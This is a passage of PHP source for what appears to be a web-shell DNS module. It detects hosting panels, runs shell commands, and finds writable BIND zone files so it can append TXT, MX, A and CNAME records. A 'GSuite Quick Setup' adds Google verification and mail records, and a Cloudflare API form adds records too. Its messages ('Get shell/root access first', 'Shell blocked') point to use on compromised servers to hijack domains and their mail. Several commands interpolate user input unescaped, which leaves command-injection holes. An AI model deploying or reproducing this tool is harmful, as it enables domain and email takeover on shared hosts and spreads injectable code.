            $result = x("plesk bin dns --add $domain -$rec_type '$rec_name' '$rec_value'");
        }
        elseif ($shell_works && in_array($detected_panel, ['HestiaCP','VestaCP'])) {
            $method = "$detected_panel CLI";
            $n = $rec_name ?: '@';
            $result = x("v-add-dns-record admin $domain $n $rec_type '$rec_value' " . ($rec_type === 'MX' ? $rec_prio : $rec_ttl));
        }
        // Method 2: Direct zone file write (PHP-native, no shell needed!)
        else {
            $method = 'Direct zone file write (PHP)';
            $zone_file = '';
            // Find zone file for this domain
            foreach ($found_zones as $z) {
                if (stripos($z['name'], $domain) !== false && $z['writable']) {
                    $zone_file = $z['path']; break;
                }
            }
            if (!$zone_file) {
                foreach ($conf_zones as $cz) {
                    if ($cz['domain'] === $domain && @is_writable($cz['file'])) {
                        $zone_file = $cz['file']; break;
                    }
                }
            }
            // Try standard paths
            if (!$zone_file) {
                foreach (["/var/named/$domain.db","/var/named/$domain.zone","/etc/bind/zones/$domain.db",
                          "/etc/bind/zones/$domain.zone","/var/lib/bind/$domain.zone"] as $c) {
                    if (@is_writable($c)) { $zone_file = $c; break; }
                }
            }
            if ($zone_file) {
                if ($rec_type === 'TXT')
                    $line = "$name_part  $rec_ttl  IN  TXT  \"$rec_value\"\n";
                elseif ($rec_type === 'MX')
                    $line = "$name_part  $rec_ttl  IN  MX  $rec_prio  $rec_value\n";
                else
                    $line = "$name_part  $rec_ttl  IN  $rec_type  $rec_value\n";

                $ok = @file_put_contents($zone_file, $line, FILE_APPEND);
                if ($ok !== false) {
                    // Bump SOA serial
                    $zc = @file_get_contents($zone_file);
                    if ($zc && preg_match('/(\d{10})\s*;\s*serial/i', $zc, $sm)) {
                        $new = date('Ymd') . str_pad(intval(substr($sm[1],-2))+1, 2, '0', STR_PAD_LEFT);
                        $zc = str_replace($sm[1], $new, $zc);
                        @file_put_contents($zone_file, $zc);
                    }
                    $reload = '';
                    if ($shell_works) $reload = trim(x("rndc reload $domain 2>&1 || systemctl reload named 2>&1"));
                    $result = "✓ Appended to $zone_file" . ($reload ? "\nReload: $reload" : "\n⚠ Shell blocked - reload DNS manually or wait for auto-reload");
                } else {
                    $result = "✗ Failed to write to $zone_file (permission denied)";
                }
            } else {
                $result = "✗ No writable zone file found for $domain\n\nPossible solutions:\n1. Get shell/root access first\n2. If DNS is external (Cloudflare/Route53), use their API\n3. Use Cloudflare API section below";
            }
        }

        echo '<div class="box" style="border-color:#00bcd4">';
        echo "<b>Method:</b> <span class='ok'>$method</span><br>";
        echo "<b>Record:</b> $name_part → $rec_type → " . htmlspecialchars($rec_value) . ($rec_prio ? " (priority: $rec_prio)" : "") . "<br><br>";
        echo '<pre>' . htmlspecialchars($result) . '</pre></div>';
    }
}

// Add Record form
echo '<div class="box">';
echo '<form method="POST"><table>';
echo '<tr><td><b>Domain:</b></td><td><input name="rec_domain" id="rec_domain_input" style="width:100%" placeholder="example.com"></td></tr>';
echo '<tr><td><b>Type:</b></td><td><select name="rec_type" id="rec_type_select" style="width:100%" onchange="togglePrio()">';
echo '<option value="TXT">TXT (GSuite verification)</option><option value="MX">MX (GSuite mail)</option>';
echo '<option value="CNAME">CNAME</option><option value="A">A</option><option value="AAAA">AAAA</option></select></td></tr>';
echo '<tr><td><b>Name:</b></td><td><input name="rec_name" style="width:100%" placeholder="(empty = root, or subdomain prefix)"></td></tr>';
echo '<tr><td><b>Value:</b></td><td><input name="rec_value" style="width:100%" placeholder="google-site-verification=xxxxx"></td></tr>';
echo '<tr id="prio_row" style="display:none"><td><b>Priority:</b></td><td><input name="rec_priority" style="width:100px" value="1" type="number"></td></tr>';
echo '<tr><td><b>TTL:</b></td><td><input name="rec_ttl" style="width:100px" value="14400" type="number"></td></tr>';
echo '</table><br><button type="submit" name="add_record" value="1">➕ Add Record</button></form></div>';

/* ─── GSuite Quick Setup ─── */
echo '<h2>⚡ GSuite Quick Setup</h2>';
if (isset($_POST['gsuite_setup'])) {
    $gs_domain = trim($_POST['gsuite_domain']);
    $gs_code   = trim($_POST['gsuite_code']);
    $gs_mx     = isset($_POST['gsuite_mx']);

    if (!$gs_domain || !$gs_code) {
        echo '<div class="box" style="border-color:#f44"><span class="no">Domain dan code wajib diisi!</span></div>';
    } else {
        echo '<div class="box" style="border-color:#4caf50">';
        echo "<b style='color:#4caf50'>Setting up GSuite for $gs_domain...</b><br><br>";

        $records = [['type'=>'TXT','name'=>'','value'=>$gs_code,'prio'=>0]];
        if ($gs_mx) {
            $records[] = ['type'=>'MX','name'=>'','value'=>'aspmx.l.google.com.','prio'=>1];
            $records[] = ['type'=>'MX','name'=>'','value'=>'alt1.aspmx.l.google.com.','prio'=>5];
            $records[] = ['type'=>'MX','name'=>'','value'=>'alt2.aspmx.l.google.com.','prio'=>5];
            $records[] = ['type'=>'MX','name'=>'','value'=>'alt3.aspmx.l.google.com.','prio'=>10];
            $records[] = ['type'=>'MX','name'=>'','value'=>'alt4.aspmx.l.google.com.','prio'=>10];
        }

        foreach ($records as $rec) {
            $name_part = $rec['name'] ? "{$rec['name']}.$gs_domain." : "$gs_domain.";
            $icon = $rec['type'] === 'TXT' ? '📝' : '📧';
            echo "$icon <b>{$rec['type']}</b> $name_part → <span style='color:#aaa'>" . htmlspecialchars($rec['value']) . "</span>";
            if ($rec['prio']) echo " (prio: {$rec['prio']})";

            // Try to add via best available method
            $ok = false;
            if ($detected_panel === 'cPanel/WHM') {
                $uapi_bin = trim(x("which uapi 2>/dev/null")) ?: '/usr/local/cpanel/bin/uapi';
                $soa_rec  = @dns_get_record($gs_domain, DNS_SOA);
                $ser      = (isset($soa_rec[0]['serial']) && $soa_rec[0]['serial']) ? $soa_rec[0]['serial'] : 0;
                if (!$ser) {
                    $pz = x("$uapi_bin DNS parse_zone zone=" . escapeshellarg($gs_domain));
                    if ($pz && preg_match('/"serial":\s*(\d+)/i', $pz, $ms)) $ser = $ms[1];
                    elseif ($pz && preg_match('/serial:\s*(\d+)/i', $pz, $ms)) $ser = $ms[1];
                }
                $ser_arg = $ser ? " serial=$ser" : "";
                
                $json_add = json_encode([
                    "dname"       => $name_part,
                    "ttl"         => 3600,
                    "record_type" => $rec['type'],
                    "data"        => [$rec['type'] === 'MX' ? "{$rec['prio']} {$rec['value']}" : $rec['value']]
                ]);
                $cmd_m = "$uapi_bin DNS mass_edit_zone zone=" . escapeshellarg($gs_domain) . "$ser_arg add=" . escapeshellarg($json_add);
                $out_m = x($cmd_m);
                
                if ($out_m && (strpos($out_m, 'status: 1') !== false || strpos($out_m, '"status":1') !== false)) {
                    echo " <span class='ok'>✓ (UAPI)</span>";
                } else {
                    // Extract error message from uapi output
                    $err_msg = 'Failed';
                    if ($out_m && preg_match('/errors:\s*\n\s*-\s*([^\n]+)/i', $out_m, $em)) {
                        $err_msg = trim($em[1]);
                    } elseif ($out_m && preg_match('/"errors":\["([^"]+)"\]/i', $out_m, $em)) {
                        $err_msg = trim($em[1]);
                    } elseif (empty($ser)) {
                        $err_msg = 'SOA serial missing';
                    }
                    echo " <span class='no'>✗ (" . htmlspecialchars($err_msg) . ")</span>";
                }
            } elseif ($shell_works && $detected_panel === 'Plesk') {
                $n = $rec['name'] ?: '';
                if ($rec['type'] === 'TXT') $out = trim(x("plesk bin dns --add $gs_domain -txt '$n' '{$rec['value']}'"));
                elseif ($rec['type'] === 'MX') $out = trim(x("plesk bin dns --add $gs_domain -mx '$n' {$rec['prio']} {$rec['value']}"));
                echo " <span class='warn'>→ " . htmlspecialchars(substr($out,0,80)) . "</span>";
            } elseif ($shell_works && in_array($detected_panel, ['HestiaCP','VestaCP'])) {
                $n = $rec['name'] ?: '@';
                $out = trim(x("v-add-dns-record admin $gs_domain $n {$rec['type']} '{$rec['value']}' " . ($rec['type']==='MX' ? $rec['prio'] : 3600)));
                echo empty($out) ? " <span class='ok'>✓</span>" : " <span class='warn'>→ $out</span>";
            } else {
                // Direct zone file (PHP native)
                $zf = '';
                foreach ($found_zones as $z) { if (stripos($z['name'], $gs_domain) !== false && $z['writable']) { $zf = $z['path']; break; } }
                if (!$zf) foreach ($conf_zones as $cz) { if ($cz['domain'] === $gs_domain && @is_writable($cz['file'])) { $zf = $cz['file']; break; } }
                if (!$zf) foreach (["/var/named/$gs_domain.db","/var/named/$gs_domain.zone","/etc/bind/zones/$gs_domain.db","/var/lib/bind/$gs_domain.zone"] as $c) { if (@is_writable($c)) { $zf=$c; break; } }

                if ($zf) {
                    if ($rec['type'] === 'TXT') $line = "$name_part 3600 IN TXT \"{$rec['value']}\"\n";
                    elseif ($rec['type'] === 'MX') $line = "$name_part 3600 IN MX {$rec['prio']} {$rec['value']}\n";
                    else $line = "$name_part 3600 IN {$rec['type']} {$rec['value']}\n";
                    $ok = @file_put_contents($zf, $line, FILE_APPEND);
                    echo $ok !== false ? " <span class='ok'>✓ → $zf</span>" : " <span class='no'>✗ write failed</span>";
                } else {
                    echo " <span class='no'>✗ no writable zone file</span>";
                }
            }
            echo '<br>';
        }

        // Reload DNS if we have shell
        if ($shell_works) {
            $reload = trim(x("rndc reload $gs_domain 2>&1 || systemctl reload named 2>&1 || service named reload 2>&1 || service bind9 reload 2>&1"));
            echo "<br><b>DNS Reload:</b> <span style='color:#aaa'>" . htmlspecialchars($reload) . "</span>";
        }
        echo '<br><br><span class="ok">✓ Done!</span>';
        echo '</div>';
    }
}

echo '<div class="box">';
echo '<form method="POST"><table>';
echo '<tr><td><b>Domain:</b></td><td><input name="gsuite_domain" id="gsuite_domain" style="width:100%" placeholder="example.com"></td></tr>';
echo '<tr><td><b>Verification Code:</b></td><td><input name="gsuite_code" style="width:100%" placeholder="google-site-verification=xxxxxxx"></td></tr>';
echo '<tr><td><b>Also add MX?</b></td><td><label><input type="checkbox" name="gsuite_mx" value="1" checked> Add Google MX records</label></td></tr>';
echo '</table><br><button type="submit" name="gsuite_setup" value="1" class="btn-green" style="color:#fff;padding:10px 25px">🚀 Setup GSuite</button></form></div>';



/* ═══════════════════════════════════════════════════
   SECTION 3: DNS LOOKUP (PHP-native, no shell needed)
   ═══════════════════════════════════════════════════ */
echo '<h2>🔎 DNS Lookup</h2>';
if (isset($_POST['do_lookup'])) {
    $ld = trim($_POST['lookup_domain']);
    $lt = strtoupper(trim($_POST['lookup_type']));
    if ($ld) {
        echo '<div class="box">';

        // Method 1: PHP dns_get_record (ALWAYS try this first)
        if (function_exists('dns_get_record')) {
            $type_map = ['ANY'=>DNS_ANY,'A'=>DNS_A,'AAAA'=>DNS_AAAA,'MX'=>DNS_MX,'TXT'=>DNS_TXT,'CNAME'=>DNS_CNAME,'NS'=>DNS_NS,'SOA'=>DNS_SOA];
            $dns_type = isset($type_map[$lt]) ? $type_map[$lt] : DNS_ANY;
            $records = @dns_get_record($ld, $dns_type);
            if ($records) {
                echo "<b style='color:#4caf50'>PHP dns_get_record() — $lt records for $ld:</b><br>";
                echo '<table><tr><th>Name</th><th>Type</th><th>TTL</th><th>Value</th></tr>';
                foreach ($records as $r) {
                    $val = '';
                    if (isset($r['txt']))     $val = $r['txt'];
                    if (isset($r['ip']))      $val = $r['ip'];
                    if (isset($r['ipv6']))    $val = $r['ipv6'];
                    if (isset($r['target']))  $val = (isset($r['pri']) ? "[{$r['pri']}] " : '') . $r['target'];
                    if (isset($r['mname']))   $val = "ns={$r['mname']} email={$r['rname']} serial={$r['serial']}";
                    echo "<tr><td>{$r['host']}</td><td><span class='tag tag-blue'>{$r['type']}</span></td><td>{$r['ttl']}</td><td style='color:#aaa;font-size:12px'>" . htmlspecialchars($val) . "</td></tr>";
                }
                echo '</table>';
            } else {
                echo "<span class='warn'>dns_get_record: No $lt records for $ld</span><br>";
            }
        }

        // Method 2: DNS-over-HTTPS
        $doh = doh_query($ld, $lt === 'ANY' ? 'A' : $lt);
        if ($doh) {
            echo "<br><b style='color:#42a5f5'>DNS-over-HTTPS (Cloudflare):</b><br>";
            if (isset($doh['Answer'])) {
                echo '<table><tr><th>Name</th><th>Type</th><th>TTL</th><th>Data</th></tr>';
                $type_names = [1=>'A',2=>'NS',5=>'CNAME',15=>'MX',16=>'TXT',28=>'AAAA',6=>'SOA'];
                foreach ($doh['Answer'] as $a) {
                    $tn = isset($type_names[$a['type']]) ? $type_names[$a['type']] : $a['type'];
                    echo "<tr><td>{$a['name']}</td><td><span class='tag tag-blue'>$tn</span></td><td>{$a['TTL']}</td><td style='color:#aaa;font-size:12px'>" . htmlspecialchars($a['data']) . "</td></tr>";
                }
                echo '</table>';
            } else {
                echo '<span class="warn">No records (Status: ' . ($doh['Status'] ?? '?') . ')</span>';
            }
        }

        // Method 3: Shell dig/nslookup (only if results are clean)
        if ($shell_works) {
            $dig = trim(x("dig $lt $ld +noall +answer 2>&1"));
            // Only show if no errors
            if ($dig && !preg_match('/permission denied|isc_socket|refused|SERVFAIL|connection timed out/i', $dig)) {
                echo '<br><b style="color:#ff9800">Shell dig:</b><br>';
                echo "<pre>" . htmlspecialchars($dig) . "</pre>";
            } else {
                // Fallback to host command (works on OVH where dig is blocked)
                $host_cmd = trim(x("host -t $lt $ld 2>&1"));
                if ($host_cmd && !preg_match('/permission denied|not found|NXDOMAIN/i', $host_cmd)) {
                    echo '<br><b style="color:#ff9800">Shell host:</b><br>';
                    echo "<pre>" . htmlspecialchars($host_cmd) . "</pre>";
                }
            }
        }

        // Nameservers (PHP-native first, then DoH)
        echo '<br><b>Nameservers:</b> ';
        $ns_found = false;
        if (function_exists('dns_get_record')) {
            $ns = @dns_get_record($ld, DNS_NS);
            if ($ns) { foreach ($ns as $n) { echo "<span class='tag tag-blue'>{$n['target']}</span> "; $ns_found = true; } }
        }
        if (!$ns_found) {
            $doh_ns = doh_query($ld, 'NS');
            if ($doh_ns && isset($doh_ns['Answer'])) {
                foreach ($doh_ns['Answer'] as $a) echo "<span class='tag tag-yellow'>{$a['data']}</span> ";
                $ns_found = true;
            }
        }
        if (!$ns_found && $shell_works) {
            $host_ns = trim(x("host -t NS $ld 2>&1"));
            if ($host_ns && !preg_match('/permission denied/i', $host_ns)) echo "<pre>" . htmlspecialchars($host_ns) . "</pre>";
        }
        echo '</div>';
    }
}

echo '<div class="box">';
echo '<form method="POST" style="display:flex;gap:8px;align-items:center">';
echo '<input name="lookup_domain" style="flex:1" placeholder="domain.com" value="' . htmlspecialchars(@$_POST['lookup_domain'] ?: '') . '">';
echo '<select name="lookup_type"><option>ANY</option><option>TXT</option><option>MX</option><option>A</option><option>AAAA</option><option>CNAME</option><option>NS</option><option>SOA</option></select>';
echo '<button type="submit" name="do_lookup" value="1">🔍 Lookup</button></form></div>';

/* ─── Cloudflare API (for external DNS) ─── */
echo '<h2>☁️ Cloudflare API (External DNS)</h2>';
echo '<div class="box">';
echo '<p style="color:#888">Kalau DNS domain ada di Cloudflare, bisa add record via API langsung dari sini.</p>';
echo '<form method="POST"><table>';
echo '<tr><td><b>API Token:</b></td><td><input name="cf_token" style="width:100%" placeholder="Bearer token atau Global API Key" value="' . htmlspecialchars(@$_POST['cf_token'] ?: '') . '"></td></tr>';
echo '<tr><td><b>Email (if Global Key):</b></td><td><input name="cf_email" style="width:100%" placeholder="(optional, only for Global API Key)"></td></tr>';
echo '<tr><td><b>Domain:</b></td><td><input name="cf_domain" style="width:100%" placeholder="example.com"></td></tr>';
echo '<tr><td><b>Record Type:</b></td><td><select name="cf_type"><option>TXT</option><option>MX</option><option>A</option><option>AAAA</option><option>CNAME</option></select></td></tr>';
echo '<tr><td><b>Name:</b></td><td><input name="cf_name" style="width:100%" placeholder="@ for root, or subdomain"></td></tr>';
echo '<tr><td><b>Content:</b></td><td><input name="cf_content" style="width:100%" placeholder="record value"></td></tr>';
echo '<tr><td><b>Priority (MX):</b></td><td><input name="cf_priority" style="width:100px" value="1" type="number"></td></tr>';
echo '</table><br>';
echo '<button type="submit" name="cf_add" value="1">☁️ Add via Cloudflare</button>';
echo '<button type="submit" name="cf_list" value="1" style="background:#666">📋 List Records</button>';
echo '</form></div>';

if (isset($_POST['cf_list']) || isset($_POST['cf_add'])) {
    $cf_token = trim($_POST['cf_token']);
    $cf_email = trim($_POST['cf_email']);
    $cf_domain = trim($_POST['cf_domain']);

    if (!$cf_token || !$cf_domain) {
        echo '<div class="box" style="border-color:#f44"><span class="no">Token dan domain wajib diisi!</span></div>';
    } else {
        // Build headers
        $headers = ['Content-Type: application/json'];
        if ($cf_email) {
            // Global API Key
            $headers[] = "X-Auth-Email: $cf_email";
            $headers[] = "X-Auth-Key: $cf_token";
        } else {
            // Bearer token
            $headers[] = "Authorization: Bearer $cf_token";
        }

        // Get zone ID
        $zone_resp = http_req("https://api.cloudflare.com/client/v4/zones?name=$cf_domain", 'GET', $headers);
        $zone_data = @json_decode($zone_resp['body'], true);

        if (!$zone_data || !$zone_data['success'] || empty($zone_data['result'])) {
            echo '<div class="box" style="border-color:#f44"><span class="no">Zone not found or auth failed!</span>';
            echo '<pre>' . htmlspecialchars($zone_resp['body']) . '</pre></div>';
        } else {
            $zone_id = $zone_data['result'][0]['id'];
            echo '<div class="box"><b>Zone ID:</b> <span class="ok">' . $zone_id . '</span><br>';

            if (isset($_POST['cf_list'])) {
                // List records
                $list_resp = http_req("https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records?per_page=100", 'GET', $headers);
                $list_data = @json_decode($list_resp['body'], true);
                if ($list_data && $list_data['success'] && !empty($list_data['result'])) {
                    echo '<table><tr><th>Type</th><th>Name</th><th>Content</th><th>TTL</th></tr>';
                    foreach ($list_data['result'] as $rec) {
                        echo '<tr><td><span class="tag tag-blue">' . $rec['type'] . '</span></td>';
                        echo '<td>' . htmlspecialchars($rec['name']) . '</td>';
                        echo '<td style="color:#aaa;font-size:12px;max-width:400px;overflow:hidden;text-overflow:ellipsis">' . htmlspecialchars($rec['content']) . '</td>';
                        echo '<td>' . $rec['ttl'] . '</td></tr>';
                    }
                    echo '</table>';
                } else {
                    echo '<span class="warn">No records or error</span>';
                }
            }

            if (isset($_POST['cf_add'])) {
                $cf_type = trim($_POST['cf_type']);
                $cf_name = trim($_POST['cf_name']) ?: '@';
                $cf_content = trim($_POST['cf_content']);
                $cf_prio = intval($_POST['cf_priority']);

                $payload = ['type'=>$cf_type, 'name'=>$cf_name, 'content'=>$cf_content, 'ttl'=>1];
                if ($cf_type === 'MX') $payload['priority'] = $cf_prio;

                $add_resp = http_req(
                    "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records",
                    'POST', $headers, json_encode($payload)
                );
                $add_data = @json_decode($add_resp['body'], true);

                if ($add_data && $add_data['success']) {
                    echo '<br><span class="ok">✓ Record added successfully!</span><br>';
                    echo '<pre>' . htmlspecialchars(json_encode($add_data['result'], JSON_PRETTY_PRINT)) . '</pre>';
                } else {
                    echo '<br><span class="no">✗ Failed to add record</span><br>';
                    echo '<pre>' . htmlspecialchars($add_resp['body']) . '</pre>';
                }
            }
            echo '</div>';
        }
    }
}

/* Manual Command section moved above DNS Lookup */

echo '<script>';
echo 'function togglePrio(){document.getElementById("prio_row").style.display=document.getElementById("rec_type_select").value==="MX"?"":"none";}togglePrio();';
echo 'var ds=document.getElementById("domain_select");if(ds){ds.onchange=function(){var v=this.value;';
echo 'var a=document.getElementById("rec_domain_input");if(a)a.value=v;';
echo 'var b=document.getElementById("gsuite_domain");if(b)b.value=v;};';
echo 'if(ds.value){var a=document.getElementById("rec_domain_input");if(a&&!a.value)a.value=ds.value;var b=document.getElementById("gsuite_domain");if(b&&!b.value)b.value=ds.value;}}';
echo '</script>';
echo '</body></html>';
